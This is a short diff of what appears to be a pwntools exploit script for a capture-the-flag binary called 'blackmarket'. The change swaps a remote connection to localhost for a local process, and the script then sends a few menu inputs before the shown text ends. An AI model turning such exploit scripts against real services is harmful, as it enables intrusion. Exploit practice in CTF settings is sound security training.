@@ -1,7 +1,8 @@
 from pwn import *
 
 def exploit():
-    p = remote("127.0.0.1", 8888)
+    #p = remote("127.0.0.1", 8888)
+    p = process("blackmarket")
     p.sendline("0")
     p.sendline("yes")
     for i in range(5):
